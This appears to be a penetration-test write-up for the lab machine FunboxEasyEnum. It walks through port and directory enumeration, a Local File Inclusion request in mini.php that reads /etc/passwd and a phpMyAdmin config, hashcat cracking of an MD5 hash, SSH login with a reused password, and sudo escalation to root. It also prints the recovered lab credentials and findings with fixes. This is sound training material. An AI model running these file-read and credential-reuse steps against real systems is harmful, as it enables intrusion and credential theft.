---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# FunboxEasyEnum

Table of Contents:

1. [#summary](./#summary "mention")
2. [#target-details](./#target-details "mention")
3. [#summary-of-findings](./#summary-of-findings "mention")
4. [#enumeration](./#enumeration "mention")
5. [#foothold](./#foothold "mention")
6. [#privilege-escalation](./#privilege-escalation "mention")

***

#### Summary

During the assessment of the host `192.168.106.132`, a critical weakness was identified that allowed full system compromise. Initial discovery revealed a vulnerability in a web component (`mini.php`) susceptible to **Local File Inclusion (LFI)**. Exploitation of this vulnerability allowed access to sensitive files such as `/etc/passwd` , and the phpMyAdmin configuration file.

Credentials retrieved from these files were reused across system accounts. Using the recovered passwords, SSH access as the user `karla` was gained, confirming the presence of the local flag. Privilege escalation was straightforward, as `karla` had unrestricted sudo rights, allowing immediate root-level access and capture of the proof flag.

**Impact:** A web-only attacker could escalate to full administrative control due to misconfigured LFI, credential reuse, and improper privilege management.

***

#### Target Details

* IP: `192.168.106.132`
* OS: Linux
* Services:
  * `22/tcp` - OpenSSH 7.6p1 (Ubuntu)
  * `80/tcp` - Apache httpd 2.4.29 (Ubuntu)

***

#### Summary of Findings

**Finding 1 - Local File Inclusion in** `mini.php`

**Severity**: Critical

**Description**: `mini.php` exposes file-read functionality that accepts user-controlled `filesrc`/`path` parameters. This allowed reading `/etc/passwd` and other sensitive files.

**Impact**: Arbitrary file-read leads to disclosure of credentials and configuration files. May lead to full system compromise.

**Recommendation**: Remove the script from public access or sanitize/whitelist file paths and require authentication.

**Finding 2 - phpMyAdmin config disclosure (plaintext credentials)**

**Severity**: High

**Description**: `/etc/phpmyadmin/config-db.php` is readable via LFI and contains DB username and password (`phpmyadmin:tgbzhnujm!`).

**Impact**: Credentials may be reused across services and used for lateral movement.

**Recommendation**: Rotate credentials, restrict config file permissions, and restrict phpMyAdmin access to trusted networks.

**Finding 3 - Credential reuse and weak password practices**

**Severity**: High

**Description**: The DB password was accepted for the `karla` account, the `orcale` account used a crackable MD5 password (`hiphop`).

**Impact**: Credential reuse reduces attack complexity and increases the likelihood of success for an attacker.

**Recommendation**: Enforce strong, unique passwords and consider central password management or MFA.

**Finding 4 - Excessive sudo privilege for** `karla`

**Severity**: Critical

**Description**: `karla` belongs to the sudo group and can run privileged commands without adequate restrictions. This allowed immediate escalation to the root (`sudo su`).

**Impact**: Any compromise  `karla` yields a full system compromise.

**Recommendation**: Restrict sudo privileges, adopt role-based least privilege, and avoid sudo group membership for non-admin accounts.

***

#### Enumeration

**Nmap Scan**

```
nmap -p- --open -sCV -vv fee.offsec -oN nmap_fee.txt
```

**Result**

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3a6aFbaxLEn4AMDXmMVZdNfaQuJQ/AcPHffagHb77o1FmSe+6tlCRHMil9l4qJILffRQHkdbQJtrlBk52V35SHfPp8x89B+Pfv7slkKxXE7fkZBIJuUjHF+YAoSakOtY72d7o6Bet2AwCijSBzZ1bkVC4i/L9euG2Oul5oA2iFlnzwYjrhki6MFNFJvvyoOqcJr1zS+w4W0NO1RexielQsxeUG3khrfVYts5kWFQPr39tk52zRZ/gpAKjR00XN4N5mi/mBjvvgnlVX4DNeyxh5r+E5sdLGzJ0Vk8JzjDW7eK70kv2KmVCFSJNceUjfaIV+K4z9wFoy6qZte7MxhaV
|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoJi5En616tTVEM4UoE0AVaXFn6+Rhike29q/pKZh5nIPQfNr9jqz2II9iZ5NZCPwsjp3QrsmTdzGwqUbjMe0c=
|   256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO+CVl8CiYP8L+ni0CvmpS7ywOiJU62E3O6L8G2n/Yov
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Fuzz**

Command:

```
gobuster dir -w ~/Documents/dump_words.txt -u http://fee.offsec -x php
```

Discovered Directories / Files:

```
/javascript           (Status: 301) [Size: 313] [--> http://fee.offsec/javascript/]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://fee.offsec/phpmyadmin/]
/mini.php             (Status: 200) [Size: 3828]
/server-status        (Status: 403) [Size: 275]
```

***

Notable finds:

* `/mini.php`  - Vulnerable to LFI
* `/phpmyadmin`

Url: `http://fee.offsec/mini.php?filesrc=/etc/passwd&path=/etc/`

Result: Contents of  `/etc/passwd` were returned.&#x20;

<figure><img src=".gitbook/assets/FEE reveal passwd.png" alt=""><figcaption></figcaption></figure>

```
root:x:0:0:root:/root:/bin/bash
...
karla:x:1000:1000:karla:/home/karla:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
harry:x:1001:1001:,,,:/home/harry:/bin/bash
sally:x:1002:1002:,,,:/home/sally:/bin/bash
goat:x:1003:1003:,,,:/home/goat:/bin/bash
oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
lissy:x:1005:1005::/home/lissy:/bin/sh
```

Url: `http://fee.offsec/mini.php?filesrc=/etc/phpmyadmin/config-db.php&path=/etc/phpmyadmin`

Result: Contents of  `/etc/phpmyadmin/config-db.php` were returned.&#x20;

<figure><img src=".gitbook/assets/FEE reveal config.png" alt=""><figcaption></figcaption></figure>

```
<?php
...
$dbuser='phpmyadmin';
$dbpass='tgbzhnujm!';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
```

Risk: LFI allowed arbitrary local file read (credential disclosure, config leakage).

**Hash Cracking** - `orcale`

Save `orcale` MD5 hash to file named as `hash`.

```
$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0
```

Command&#x20;

```
hashcat -m 500 hash /usr/share/wordlists/rockyou.txt
```

Result:

<pre><code><strong>oracle:hiphop
</strong></code></pre>

**Credential usage and SSH access**

Credential discovered:

* `phpmyadmin` (dbuser) password: `tgbzhnujm!`&#x20;
* `orcale` password: `hiphop`

***

#### Foothold

Attempt SSH logins for enumerated users using `tgbzhnujm!`. Successful login:

```
ssh karla@fee.offsec
```

***

#### Privilege Escalation

Enumerate privileges

Command:

```
sudo -l
```

<figure><img src=".gitbook/assets/FEE SSH karla and enumerate privileges.png" alt=""><figcaption></figcaption></figure>

Observation: `karla` is a member of the `sudo` group.

Privilege escalation performed using:

```
sudo su
```

Successful privilege escalated to `root`.
